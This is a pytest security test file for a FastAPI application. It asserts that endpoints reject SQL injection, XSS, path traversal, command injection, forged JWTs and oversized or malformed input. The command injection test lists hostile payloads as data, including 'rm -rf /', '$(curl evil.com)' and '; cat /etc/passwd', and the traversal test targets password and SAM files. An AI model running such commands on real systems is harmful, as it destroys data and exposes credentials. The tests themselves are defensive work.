"""
Security Input Validation Tests

This module tests input validation and security measures implemented
across the application endpoints.
"""

import json
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient

from resync.main import app


class TestInputValidation:
    """Test input validation security measures."""

    def setup_method(self):
        """Set up test client."""
        self.client = TestClient(app)

    @pytest.mark.security
    def test_sql_injection_prevention(self, security_test_data):
        """Test SQL injection prevention across endpoints."""
        sql_payloads = security_test_data["sql_injection"]

        for payload in sql_payloads:
            # Test /api/status endpoint with malicious input
            response = self.client.get(f"/api/status?check={payload}")
            # Should not execute SQL, should return normal response or 400
            assert response.status_code in [200, 400, 422, 503]

            # Test /api/agents endpoint with malicious input
            response = self.client.get(f"/api/agents?filter={payload}")
            assert response.status_code in [200, 400, 422]

    @pytest.mark.security
    def test_xss_prevention(self, security_test_data):
        """Test XSS prevention across endpoints."""
        xss_payloads = security_test_data["xss_payloads"]

        for payload in xss_payloads:
            # Test /api/chat endpoint
            response = self.client.post("/api/chat", json={"message": payload})
            assert response.status_code in [200, 400, 422]

            # Verify response doesn't contain unescaped script tags
            if response.status_code == 200:
                response_data = response.json()
                response_str = json.dumps(response_data)
                assert "<script>" not in response_str

    @pytest.mark.security
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention."""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",
        ]

        for payload in traversal_payloads:
            response = self.client.get(f"/files/{payload}")
            # Should prevent path traversal
            assert response.status_code in [400, 404, 422]

    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test command injection prevention."""
        command_payloads = [
            "rm -rf /",
            "del C:\\*.* /Q",
            "$(curl evil.com)",
            "`whoami`",
            "; cat /etc/passwd",
        ]

        for payload in command_payloads:
            response = self.client.post("/execute", json={"command": payload})
            # Should prevent command execution
            assert response.status_code in [400, 404, 422, 501]

    @pytest.mark.security
    def test_malicious_header_handling(self, security_test_data):
        """Test handling of malicious headers."""
        malicious_headers = security_test_data["malicious_headers"]

        # Test with malicious headers on existing endpoints
        response = self.client.get("/api/status", headers=malicious_headers)
        assert response.status_code in [200, 400, 503]

        # Verify headers are properly sanitized
        if response.status_code == 200:
            # Should not expose internal information
            response_data = response.json()
            assert "internal" not in json.dumps(response_data).lower()

    @pytest.mark.security
    def test_large_payload_handling(self):
        """Test handling of oversized payloads."""
        # Create a payload that exceeds max_length
        large_payload = {"content": "x" * 1001}  # Exceeds max_length=1000

        response = self.client.post("/api/review", json=large_payload)
        # Should reject due to validation
        assert response.status_code == 422

    @pytest.mark.security
    def test_invalid_json_handling(self):
        """Test handling of invalid JSON payloads."""
        invalid_json_payloads = [
            "{invalid json}",
            "{'key': 'value',}",  # Trailing comma
            "{{'nested': 'value'}",  # Mismatched braces
            "{'key': 'unclosed value}",
            "null",
            "undefined",
        ]

        for payload in invalid_json_payloads:
            response = self.client.post(
                "/api/review",
                data=payload,
                headers={"Content-Type": "application/json"},
            )
            # Should handle invalid JSON gracefully
            assert response.status_code == 422

    @pytest.mark.security
    def test_unicode_handling(self):
        """Test handling of various Unicode inputs."""
        unicode_payloads = [
            {"content": "🚀 Unicode test"},
            {"content": "测试中文"},
            {"content": "тест на русском"},
            {"content": "🌍 International"},
            {"content": "\u0000\u001f\u007f"},  # Control characters
            {"content": "\u200b\u200c\u200d"},  # Zero-width characters
        ]

        for payload in unicode_payloads:
            response = self.client.post("/api/review", json=payload)
            # Should handle Unicode properly
            assert response.status_code == 200

    @pytest.mark.security
    def test_rate_limiting(self):
        """Test rate limiting functionality."""
        # Make multiple rapid requests to existing endpoints
        for i in range(10):
            response = self.client.get("/api/status")

        # Should eventually be rate limited
        # Note: This test might need adjustment based on actual rate limiting implementation
        assert response.status_code in [200, 429, 503]

    @pytest.mark.security
    def test_cors_handling(self):
        """Test CORS policy enforcement."""
        cors_headers = {
            "Origin": "http://malicious-site.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "X-Custom-Header",
        }

        response = self.client.options("/review", headers=cors_headers)
        # Should handle CORS properly
        assert response.status_code in [200, 403, 404]

    @pytest.mark.security
    def test_content_type_validation(self):
        """Test content type validation."""
        # Test with wrong content type
        response = self.client.post(
            "/api/review",
            data="not json",
            headers={"Content-Type": "text/plain"},
        )
        assert response.status_code == 422

        # Test with no content type
        response = self.client.post("/api/review", json={"content": "test"})
        # Should work with proper JSON
        assert response.status_code == 200


class TestAuthenticationSecurity:
    """Test authentication and authorization security."""

    def setup_method(self):
        self.client = TestClient(app)

    @pytest.mark.security
    def test_jwt_token_validation(self):
        """Test JWT token validation edge cases."""
        invalid_tokens = [
            "",  # Empty token
            "invalid.jwt.token",  # Invalid format
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",  # Invalid signature
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",  # Wrong algorithm
        ]

        for token in invalid_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = self.client.get("/api/protected", headers=headers)
            # Should reject invalid tokens
            assert response.status_code == 401

    @pytest.mark.security
    def test_expired_token_handling(self):
        """Test handling of expired tokens."""
        # This would require a mock JWT token that is actually expired
        expired_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.fake"

        headers = {"Authorization": f"Bearer {expired_token}"}
        response = self.client.get("/api/protected", headers=headers)
        assert response.status_code == 401

    @pytest.mark.security
    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation attacks."""
        # Test with user token trying to access admin endpoints
        user_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.fake"

        headers = {"Authorization": f"Bearer {user_token}"}
        response = self.client.get("/api/admin/users", headers=headers)
        # Should deny access to admin endpoints
        assert response.status_code == 403


class TestEncryptionSecurity:
    """Test encryption and data protection measures."""

    def setup_method(self):
        self.client = TestClient(app)

    @pytest.mark.security
    def test_sensitive_data_encryption(self):
        """Test that sensitive data is properly encrypted."""
        from resync.core.encryption_service import EncryptionService

        # Mock the encryption service
        with patch.object(EncryptionService, "encrypt") as mock_encrypt:
            mock_encrypt.return_value = "encrypted_test"

            # POST to sensitive endpoint which uses encryption
            response = self.client.post("/api/sensitive", json={"data": "test"})
            assert response.status_code == 200
            assert mock_encrypt.called
            assert "encrypted_test" in response.json()["encrypted"]

    @pytest.mark.security
    def test_data_masking_in_logs(self):
        """Test that sensitive data is masked in logs."""
        # Mock the underlying logger.info to capture masked log output
        with patch("resync.core.logger.logger.info") as mock_log:
            # POST to sensitive endpoint which logs the data
            response = self.client.post(
                "/api/sensitive", json={"data": "password=secret123"}
            )
            assert response.status_code == 200

            # Verify that sensitive data is masked in logs
            assert mock_log.called
            logged_message = mock_log.call_args[0][0]
            assert "secret123" not in logged_message
            assert "***" in logged_message
